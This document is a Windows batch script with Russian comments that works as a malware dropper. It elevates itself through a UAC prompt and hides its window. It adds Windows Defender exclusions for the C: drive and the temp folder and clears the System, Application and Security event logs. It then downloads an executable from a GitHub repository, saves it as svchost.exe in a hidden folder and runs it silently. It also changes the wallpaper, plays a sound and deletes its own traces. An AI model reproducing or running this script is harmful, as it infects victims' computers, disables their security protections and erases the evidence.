@echo off
setlocal enabledelayedexpansion

set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (
  echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
  echo UAC.ShellExecute "cmd.exe", "/c """"%~s0"" %params:""=""^&""""", "", "runas", 0 >> "%temp%\getadmin.vbs"
  "%temp%\getadmin.vbs"
  exit /B
)

color 00
mode con cols=1 lines=1
title Windows

powershell -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1

powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1

wevtutil cl System >nul 2>&1
wevtutil cl Application >nul 2>&1
wevtutil cl Security >nul 2>&1

if not exist "C:\indiva" mkdir "C:\indiva" >nul 2>&1
attrib +s +h "C:\indiva" >nul 2>&1

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/yutuytuy3213/raw/main/Client.exe' -OutFile 'C:\indiva\svchost.exe'" >nul 2>&1

powershell -Command "Start-Process -FilePath 'C:\indiva\svchost.exe' -WindowStyle Hidden" >nul 2>&1

:: Настройка путей
set "workdir=C:\indiva"
cd /d "%workdir%"

:: Ссылки на файлы (ЗАМЕНИТЕ НА ВАШИ)
set "imgUrl=https://github.com/Pythonist310/ytrytry/raw/main/1.jpg"
set "mp3Url=https://github.com/Pythonist310/ytrytry/raw/main/2.mp3"

:: Скрытое скачивание
powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%imgUrl%' -OutFile 'bg.jpg'; Invoke-WebRequest -Uri '%mp3Url%' -OutFile 'sound.mp3'" >nul 2>&1

:: Создание фонового скрипта логики
(
echo Add-Type -AssemblyName PresentationCore
echo $code = @'
echo [DllImport("user32.dll", CharSet = CharSet.Auto^)]
echo public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni^);
echo '@
echo $type = Add-Type -MemberDefinition $code -Name 'Win32' -Namespace 'Utils' -PassThru
echo $type::SystemParametersInfo(0x0014, 0, 'C:\indiva\bg.jpg', 0x01 -bor 0x02^) ^| Out-Null
echo $player = New-Object System.Windows.Media.MediaPlayer
echo $player.Open('C:\indiva\sound.mp3'^)
echo $player.Play(^)
echo Start-Sleep -Seconds 2
echo while($player.NaturalDuration.HasTimeSpan -and $player.Position -lt $player.NaturalDuration.TimeSpan^){ Start-Sleep -Seconds 1 }
echo $player.Close(^)
) > action.ps1

:: Запуск выполнения без окна
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "action.ps1" >nul 2>&1

:: Тихая очистк
del /f /q "bg.jpg" >nul 2>&1
del /f /q "sound.mp3" >nul 2>&1
del /f /q "action.ps1" >nul 2>&1
exit
